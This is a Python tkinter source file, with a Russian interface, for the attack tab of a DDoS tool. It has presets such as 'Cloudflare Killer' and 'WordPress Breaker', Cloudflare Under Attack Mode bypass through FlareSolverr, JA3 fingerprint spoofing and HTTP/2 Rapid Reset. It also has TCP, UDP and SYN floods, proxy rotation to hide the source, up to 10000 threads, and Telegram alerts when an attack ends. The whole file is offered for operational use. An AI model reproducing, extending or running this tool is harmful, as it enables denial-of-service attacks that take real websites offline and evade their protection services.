import tkinter as tk
from tkinter import ttk, scrolledtext, messagebox, filedialog, simpledialog
import threading, time, random, requests
from engine.attack import AsyncAttackEngine
from gui.widgets import ToolTip, RightClickMenu
from utils.helpers import load_profiles, save_profile, delete_profile

PRESETS = {
    "Cloudflare Killer": {
        "method": "CFBUAM", "flare": "http://localhost:8191/v1", "ja3": "random",
        "storm": True, "h2": True, "adaptive": True, "elite_only": True
    },
    "DDoS-Guard Crusher": {
        "method": "BOT", "storm": True, "h2": True, "jitter": 5, "adaptive": True
    },
    "WordPress Breaker": {
        "method": "POST", "target_path": "/xmlrpc.php", "threads_mult": 2, "socks5": True
    },
    "Stealth Sniper": {
        "method": "GET", "stealth": True, "jitter": 50, "elite_only": True, "ja3": "random"
    }
}

class AttackTab(ttk.Frame):
    def __init__(self, parent, app):
        super().__init__(parent)
        self.app = app
        self.proxy_mgr = app.proxy_manager
        self.attack_active = False
        self.engine = None
        self._animating = False
        self.time_limit = 0
        self.time_start = 0
        self._build_ui()
        self.app.logger.info("Вкладка Атаки v3.1 инициализирована")
        self.app.root.bind('<Control-Return>', lambda e: self._start_attack())
        self.app.root.bind('<Control-Key-Return>', lambda e: self._start_attack())

    def _build_ui(self):
        self.columnconfigure(0, weight=1)
        self.rowconfigure(1, weight=1)

        top = ttk.Frame(self)
        top.grid(row=0, column=0, sticky='ew', padx=10, pady=5)
        ttk.Label(top, text="Цель:").pack(side=tk.LEFT)
        self.target_entry = ttk.Entry(top, width=50)
        self.target_entry.pack(side=tk.LEFT, padx=5)
        ToolTip(self.target_entry, "Доменное имя или IP-адрес цели")
        ttk.Button(top, text="📋", width=3, command=lambda: self.target_entry.insert(0, self.app.root.clipboard_get())).pack(side=tk.LEFT)
        ttk.Button(top, text="📂", width=3, command=self._load_targets_file).pack(side=tk.LEFT, padx=2)

        ttk.Label(top, text="Пресет:").pack(side=tk.LEFT, padx=(10,0))
        self.preset_var = tk.StringVar()
        preset_combo = ttk.Combobox(top, textvariable=self.preset_var, values=list(PRESETS.keys()), state='readonly', width=20)
        preset_combo.pack(side=tk.LEFT, padx=5)
        ToolTip(preset_combo, "Готовая конфигурация атаки")
        ttk.Button(top, text="⚡ Применить", command=self._apply_preset).pack(side=tk.LEFT)
        self.preset_combo = preset_combo

        ttk.Label(top, text="Профиль:").pack(side=tk.LEFT, padx=(10,0))
        self.profile_var = tk.StringVar()
        self.profile_combo = ttk.Combobox(top, textvariable=self.profile_var, state='readonly', width=15)
        self.profile_combo.pack(side=tk.LEFT, padx=5)
        ToolTip(self.profile_combo, "Сохранённые настройки атаки")
        self.profile_combo.bind('<<ComboboxSelected>>', self._load_profile)
        ttk.Button(top, text="💾", command=self._save_profile).pack(side=tk.LEFT)
        ttk.Button(top, text="🗑", command=self._delete_profile).pack(side=tk.LEFT)
        self._refresh_profiles()

        self.sub_notebook = ttk.Notebook(self)
        self.sub_notebook.grid(row=1, column=0, sticky='nsew', padx=10, pady=5)
        self._build_l7_tab(self.sub_notebook)
        self._build_l4_tab(self.sub_notebook)

        bottom = ttk.Frame(self)
        bottom.grid(row=2, column=0, sticky='ew', padx=10, pady=5)
        self._build_bottom_panel(bottom)

        log_frame = ttk.Frame(self)
        log_frame.grid(row=3, column=0, sticky='nsew', padx=10, pady=5)
        log_bg = '#121212' if self.app.theme=='dark' else 'white'
        log_fg = '#00ff41' if self.app.theme=='dark' else 'black'
        self.log = scrolledtext.ScrolledText(log_frame, bg=log_bg, fg=log_fg, font=('Consolas', 9), height=12)
        self.log.pack(fill=tk.BOTH, expand=True)
        RightClickMenu(self.log, get_text_func=lambda: self.log.selection_get() if self.log.tag_ranges(tk.SEL) else self.log.get("1.0", tk.END).rstrip('\n'))
        self.log.tag_configure("success", foreground="#00ff41")
        self.log.tag_configure("error", foreground="#ff4444")
        self.log.tag_configure("info", foreground="#00aaff")
        self.log.tag_configure("warning", foreground="#ffaa00")

        self.app.root.bind('<Return>', lambda e: self._start_attack())
        self.app.root.bind('<Escape>', lambda e: self._stop_attack())
        self.app.root.bind('<Control-l>', lambda e: self.log.delete(1.0, tk.END))

    def _build_l7_tab(self, notebook):
        l7 = ttk.Frame(notebook)
        notebook.add(l7, text="L7")
        ttk.Label(l7, text="Метод:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.method_var = tk.StringVar(value="CFBUAM")
        methods = ttk.Combobox(l7, textvariable=self.method_var,
                               values=["GET","POST","CFB","CFBUAM","RAPID"], state='readonly', width=15)
        methods.grid(row=0, column=1, sticky='w')
        ToolTip(methods, "GET — простой флуд, POST — отправка данных, CFB — Cloudflare bypass, CFBUAM — обход Under Attack Mode, RAPID — HTTP/2 Rapid Reset")
        adv = ttk.LabelFrame(l7, text="Обход защиты и усиление", padding=5)
        adv.grid(row=1, column=0, columnspan=2, sticky='ew', pady=5)
        self.flare_url_var = tk.StringVar()
        ttk.Label(adv, text="FlareSolverr:").grid(row=0, column=0, sticky='w')
        ttk.Entry(adv, textvariable=self.flare_url_var, width=30).grid(row=0, column=1, padx=5)
        self.ja3_var = tk.StringVar(value="none")
        ttk.Label(adv, text="JA3:").grid(row=1, column=0, sticky='w')
        ttk.Combobox(adv, textvariable=self.ja3_var, values=["none","chrome120","random"], state='readonly', width=14).grid(row=1, column=1, sticky='w')
        self.h2_var = tk.BooleanVar()
        ttk.Checkbutton(adv, text="HTTP/2", variable=self.h2_var).grid(row=2, column=0, sticky='w')
        self.storm_var = tk.BooleanVar()
        ttk.Checkbutton(adv, text="Браузерный шторм", variable=self.storm_var).grid(row=2, column=1, sticky='w')
        self.smart_flood_var = tk.BooleanVar()
        ttk.Checkbutton(adv, text="Умный флуд", variable=self.smart_flood_var).grid(row=3, column=0, sticky='w')
        self.berserk_var = tk.BooleanVar()
        ttk.Checkbutton(adv, text="Берсерк", variable=self.berserk_var).grid(row=3, column=1, sticky='w')
        self.stealth_var = tk.BooleanVar()
        ttk.Checkbutton(adv, text="Тихая", variable=self.stealth_var).grid(row=4, column=0, sticky='w')
        self.adaptive_var = tk.BooleanVar(value=True)
        ttk.Checkbutton(adv, text="Адаптивный", variable=self.adaptive_var).grid(row=4, column=1, sticky='w')
        ttk.Label(adv, text="Задержка (мс):").grid(row=5, column=0, sticky='w')
        self.jitter_var = tk.IntVar(value=0)
        ttk.Spinbox(adv, from_=0, to=200, width=5, textvariable=self.jitter_var).grid(row=5, column=1, sticky='w')

        self.indicators = {}
        for idx, (var, name, row, col) in enumerate([
            (self.h2_var,'h2',2,2), (self.storm_var,'storm',2,3),
            (self.smart_flood_var,'smart',3,2), (self.berserk_var,'berserk',3,3),
            (self.stealth_var,'stealth',4,2), (self.adaptive_var,'adaptive',4,3)
        ]):
            lbl = tk.Label(adv, text="  ", bg="grey", width=2)
            lbl.grid(row=row, column=col, padx=5)
            self.indicators[name] = lbl
            var.trace('w', lambda *a, v=var, n=name: self.indicators[n].config(bg='#00ff41' if v.get() else 'grey'))

    def _build_l4_tab(self, notebook):
        l4 = ttk.Frame(notebook)
        notebook.add(l4, text="L4")
        ttk.Label(l4, text="Метод:").grid(row=0, column=0, sticky='w', padx=5, pady=5)
        self.l4_method_var = tk.StringVar(value="UDP")
        ttk.Combobox(l4, textvariable=self.l4_method_var, values=["TCP","UDP","SYN_FLOOD"], state='readonly', width=10).grid(row=0, column=1, sticky='w')
        ttk.Label(l4, text="Порт:").grid(row=1, column=0, sticky='w', padx=5, pady=5)
        self.port_var = tk.IntVar(value=80)
        ttk.Entry(l4, textvariable=self.port_var, width=8).grid(row=1, column=1, sticky='w')
        self.l4_random_size = tk.BooleanVar()
        ttk.Checkbutton(l4, text="Случайный размер пакета (UDP)", variable=self.l4_random_size).grid(row=2, column=0, columnspan=2, sticky='w')
        self.hybrid_var = tk.BooleanVar()
        ttk.Checkbutton(l4, text="ГИБРИДНАЯ АТАКА (L7+L4 одновременно)", variable=self.hybrid_var).grid(row=3, column=0, columnspan=2, sticky='w', pady=5)

    def _build_bottom_panel(self, parent):
        proxy_frame = ttk.LabelFrame(parent, text="Прокси", padding=5)
        proxy_frame.pack(side=tk.LEFT, fill=tk.Y, padx=5)
        self.custom_proxy_text = tk.Text(proxy_frame, height=3, width=40,
                                         bg='#2d2d2d' if self.app.bg=='#121212' else 'white',
                                         fg=self.app.fg)
        self.custom_proxy_text.pack()
        RightClickMenu(self.custom_proxy_text,
                       get_text_func=lambda: self.custom_proxy_text.get("1.0", tk.END).strip())
        self.proxy_mode_var = tk.StringVar(value="best")
        ttk.Radiobutton(proxy_frame, text="Лучшие", variable=self.proxy_mode_var, value="best").pack(anchor='w')
        ttk.Radiobutton(proxy_frame, text="Все (HTTP+SOCKS5)", variable=self.proxy_mode_var, value="all").pack(anchor='w')
        ttk.Radiobutton(proxy_frame, text="Только HTTP", variable=self.proxy_mode_var, value="http").pack(anchor='w')
        ttk.Radiobutton(proxy_frame, text="Только SOCKS5", variable=self.proxy_mode_var, value="socks5").pack(anchor='w')
        ttk.Radiobutton(proxy_frame, text="Свой список", variable=self.proxy_mode_var, value="custom").pack(anchor='w')

        ctrl_frame = ttk.Frame(parent)
        ctrl_frame.pack(side=tk.LEFT, fill=tk.BOTH, expand=True, padx=5)
        ttk.Label(ctrl_frame, text="Потоки:").grid(row=0, column=0, sticky='w')
        self.threads_var = tk.IntVar(value=100)
        ttk.Spinbox(ctrl_frame, from_=1, to=10000, increment=10, textvariable=self.threads_var, width=6).grid(row=0, column=1, sticky='w')
        self.power_var = tk.BooleanVar()
        ttk.Checkbutton(ctrl_frame, text="Макс", variable=self.power_var).grid(row=0, column=2, sticky='w')
        ttk.Label(ctrl_frame, text="Лимит времени (сек):").grid(row=1, column=0, sticky='w')
        self.time_limit_var = tk.IntVar(value=0)
        ttk.Spinbox(ctrl_frame, from_=0, to=3600, textvariable=self.time_limit_var, width=6).grid(row=1, column=1, sticky='w')
        ttk.Label(ctrl_frame, text="Лимит запросов:").grid(row=2, column=0, sticky='w')
        self.req_limit_var = tk.IntVar(value=0)
        ttk.Spinbox(ctrl_frame, from_=0, to=1000000, textvariable=self.req_limit_var, width=8).grid(row=2, column=1, sticky='w')

        self.attack_btn = ttk.Button(ctrl_frame, text="🚀 ЗАПУСТИТЬ", command=self._start_attack, style='Accent.TButton')
        self.attack_btn.grid(row=3, column=0, columnspan=2, pady=10, sticky='we')
        self.stop_btn = ttk.Button(ctrl_frame, text="⏹ СТОП", command=self._stop_attack, state=tk.DISABLED)
        self.stop_btn.grid(row=3, column=2, padx=5)

        self.progress_var = tk.DoubleVar()
        self.progress_bar = ttk.Progressbar(ctrl_frame, variable=self.progress_var, maximum=100, mode='determinate', style='green.Horizontal.TProgressbar')
        self.progress_bar.grid(row=4, column=0, columnspan=3, sticky='ew', pady=5)
        self.status_label = ttk.Label(ctrl_frame, text="Готов")
        self.status_label.grid(row=5, column=0, columnspan=3, sticky='w')

    # ---- Профили, пресеты, атака ----
    def _apply_preset(self):
        name = self.preset_var.get()
        if name not in PRESETS: return
        p = PRESETS[name]
        self.method_var.set(p.get('method', 'CFBUAM'))
        self.flare_url_var.set(p.get('flare', ''))
        self.ja3_var.set(p.get('ja3', 'none'))
        self.h2_var.set(p.get('h2', False))
        self.storm_var.set(p.get('storm', False))
        self.stealth_var.set(p.get('stealth', False))
        self.adaptive_var.set(p.get('adaptive', True))
        self.jitter_var.set(p.get('jitter', 0))
        if p.get('threads_mult'):
            self.threads_var.set(int(self.threads_var.get()) * p.get('threads_mult'))
        self.proxy_mode_var.set('socks5' if p.get('socks5') else 'best')
        if p.get('target_path'):
            base = self.target_entry.get().strip().rstrip('/')
            if base:
                self.target_entry.delete(0, tk.END)
                self.target_entry.insert(0, base + p['target_path'])
        messagebox.showinfo("Пресет", f"Настройки '{name}' применены")

    def _refresh_profiles(self):
        profiles = load_profiles()
        self.profile_combo['values'] = list(profiles.keys())

    def _save_profile(self):
        name = simpledialog.askstring("Профиль", "Имя профиля:")
        if not name: return
        config = {
            'target': self.target_entry.get().strip(),
            'method': self.method_var.get(),
            'l4_method': self.l4_method_var.get(),
            'port': self.port_var.get(),
            'threads': self.threads_var.get(),
            'power': self.power_var.get(),
            'h2': self.h2_var.get(),
            'storm': self.storm_var.get(),
            'smart_flood': self.smart_flood_var.get(),
            'berserk': self.berserk_var.get(),
            'stealth': self.stealth_var.get(),
            'adaptive': self.adaptive_var.get(),
            'flare_url': self.flare_url_var.get(),
            'ja3': self.ja3_var.get(),
            'jitter': self.jitter_var.get(),
            'l4_random_size': self.l4_random_size.get(),
            'hybrid': self.hybrid_var.get(),
            'proxy_mode': self.proxy_mode_var.get(),
            'custom_proxies': self.custom_proxy_text.get("1.0", tk.END).strip()
        }
        save_profile(name, config)
        self._refresh_profiles()
        self.profile_var.set(name)

    def _load_profile(self, event=None):
        name = self.profile_var.get()
        profiles = load_profiles()
        if name not in profiles: return
        config = profiles[name]
        self.target_entry.delete(0, tk.END)
        self.target_entry.insert(0, config.get('target', ''))
        self.method_var.set(config.get('method', 'CFBUAM'))
        self.l4_method_var.set(config.get('l4_method', 'UDP'))
        self.port_var.set(config.get('port', 80))
        self.threads_var.set(config.get('threads', 100))
        self.power_var.set(config.get('power', False))
        self.h2_var.set(config.get('h2', False))
        self.storm_var.set(config.get('storm', False))
        self.smart_flood_var.set(config.get('smart_flood', False))
        self.berserk_var.set(config.get('berserk', False))
        self.stealth_var.set(config.get('stealth', False))
        self.adaptive_var.set(config.get('adaptive', True))
        self.flare_url_var.set(config.get('flare_url', ''))
        self.ja3_var.set(config.get('ja3', 'none'))
        self.jitter_var.set(config.get('jitter', 0))
        self.l4_random_size.set(config.get('l4_random_size', False))
        self.hybrid_var.set(config.get('hybrid', False))
        self.proxy_mode_var.set(config.get('proxy_mode', 'best'))
        self.custom_proxy_text.delete("1.0", tk.END)
        self.custom_proxy_text.insert("1.0", config.get('custom_proxies', ''))

    def _delete_profile(self):
        name = self.profile_var.get()
        if not name: return
        delete_profile(name)
        self._refresh_profiles()
        self.profile_var.set('')

    def _load_targets_file(self):
        f = filedialog.askopenfilename(filetypes=[("Text files", "*.txt")])
        if f:
            with open(f) as fh:
                first_line = fh.readline().strip()
                if first_line:
                    self.target_entry.delete(0, tk.END)
                    self.target_entry.insert(0, first_line)

    def _start_attack(self):
        if self.attack_active: return
        target = self.target_entry.get().strip()
        if not target:
            messagebox.showerror("Ошибка", "Введите цель")
            return
        l7_method = self.method_var.get()
        l4_method = self.l4_method_var.get()
        if l7_method not in ("TCP", "UDP", "SYN_FLOOD"):
            method = l7_method
            port = None
        else:
            method = l4_method
            port = self.port_var.get()

        threads = self.threads_var.get()
        if self.power_var.get(): threads = min(threads*2, 10000)
        if self.stealth_var.get(): threads = 1

        jitter = self.jitter_var.get()
        flare_url = self.flare_url_var.get().strip() or None
        ja3 = self.ja3_var.get()
        ja3_profile = None if ja3 == "none" else ja3
        random_ja3 = (ja3 == "random")
        smart_flood = self.smart_flood_var.get()
        berserk = self.berserk_var.get()
        udp_random_size = self.l4_random_size.get()
        hybrid = self.hybrid_var.get()

        proxy_list = self._get_proxy_list()

        self.engine = AsyncAttackEngine(
            proxy_list, port=port, obfuscate=True, jitter=jitter,
            flare_solverr_url=flare_url, ja3_profile=ja3_profile,
            stealth=self.stealth_var.get(),
            browser_storm=self.storm_var.get(),
            use_h2=self.h2_var.get(),
            adaptive=self.adaptive_var.get(),
            random_ja3=random_ja3,
            smart_flood=smart_flood,
            berserk=berserk,
            l4_method=l4_method,
            udp_random_size=udp_random_size
        )

        self.attack_active = True
        self._animate_start()
        self.stop_btn.config(state=tk.NORMAL)
        self.progress_var.set(0)
        self.log.insert(tk.END, "[*] Атака начата\n", "info")
        self.app.logger.info(f"Атака: {target} метод {method} потоков {threads}")
        if hasattr(self.app, 'set_status'):
            self.app.set_status("Атака", f"Цель: {target} | Метод: {method} | Потоков: {threads}")
        self.time_limit = self.time_limit_var.get()
        self.time_start = time.time()
        threading.Thread(target=self._run_attack, args=(target, method, threads, hybrid, l4_method), daemon=True).start()

    def _run_attack(self, target, method, threads, hybrid, l4_method):
        start = time.time()
        def progress(rps, total):
            if hasattr(self.app, 'update_monitor'):
                self.app.update_monitor(rps, total)
            self._log_colored(f"RPS: {rps:.1f} | Запросов: {total}\n", "success")
            if self.time_limit > 0 and time.time() - self.time_start > self.time_limit:
                self.engine.stop()
            if self.req_limit_var.get() > 0 and total >= self.req_limit_var.get():
                self.engine.stop()
            self.progress_var.set(min(100, (total % 1000) / 10))

        try:
            self.engine.launch(target, method, threads, progress_callback=progress, hybrid=hybrid, l4_method=l4_method)
        except Exception as e:
            self.app.logger.error(f"Ошибка в движке атаки: {e}")
            self._log_colored(f"❌ Ошибка движка: {e}\n", "error")

        end = time.time()
        total_requests = self.engine.stats['count']
        if hasattr(self.app, 'save_attack_history'):
            self.app.save_attack_history(target, method, threads, start, end, total_requests)
        self.attack_active = False
        self.after(0, self._attack_finished)
        self._log_colored(f"[✓] Атака завершена за {end-start:.1f}с, запросов: {total_requests}\n", "info")
        self._notify_telegram(target, method, threads, end-start, total_requests)
        if hasattr(self.app, 'show_toast'):
            self.app.show_toast(f"Атака завершена: {total_requests} запросов за {end-start:.1f}с")

    def _stop_attack(self):
        if self.engine:
            self.engine.stop()
        self.attack_active = False
        self.app.logger.warning("Атака остановлена пользователем")
        self._attack_finished()

    def _get_proxy_list(self):
        mode = self.proxy_mode_var.get()
        if mode == "custom":
            custom = self.custom_proxy_text.get("1.0", tk.END).strip()
            if custom:
                return [line.strip() for line in custom.splitlines() if line.strip()]
        if self.proxy_mgr and hasattr(self.proxy_mgr, 'proxies'):
            if mode == "best":
                return self.proxy_mgr.get_best_proxies(50)
            elif mode == "all":
                return [f"{p['ip']}:{p['port']}" for p in self.proxy_mgr.proxies]
            elif mode == "http":
                return self.proxy_mgr.get_best_proxies(50, proxy_type='http')
            elif mode == "socks5":
                return self.proxy_mgr.get_best_proxies(50, proxy_type='socks5')
        return []

    def _notify_telegram(self, target, method, threads, duration, total_requests):
        token = getattr(self.app, 'settings', {}).get('telegram_token', '')
        chat_id = getattr(self.app, 'settings', {}).get('telegram_chat_id', '')
        if not token or not chat_id: return
        try:
            msg = f"✅ Атака завершена\nЦель: {target}\nМетод: {method}\nПотоков: {threads}\nДлительность: {duration:.1f}с\nЗапросов: {total_requests}"
            requests.post(f"https://api.telegram.org/bot{token}/sendMessage",
                          json={"chat_id": chat_id, "text": msg}, timeout=5)
        except: pass

    def _animate_start(self):
        self._animating = True
        self._animate_button(0)

    def _animate_button(self, count):
        if not self._animating or not self.attack_active: return
        self.attack_btn.config(text="⚡ АТАКА..." if count % 2 == 0 else "⚡⚡ АТАКА...")
        self.after(500, self._animate_button, count + 1)

    def _attack_finished(self):
        self._animating = False
        self.attack_btn.config(text="🚀 ЗАПУСТИТЬ")
        self.stop_btn.config(state=tk.DISABLED)
        self.progress_var.set(0)
        self.status_label.config(text="Готов")
        if hasattr(self.app, 'set_status'):
            self.app.set_status("Готов")

    def _log_colored(self, msg, tag):
        self.log.insert(tk.END, msg, tag)
        self.log.see(tk.END)
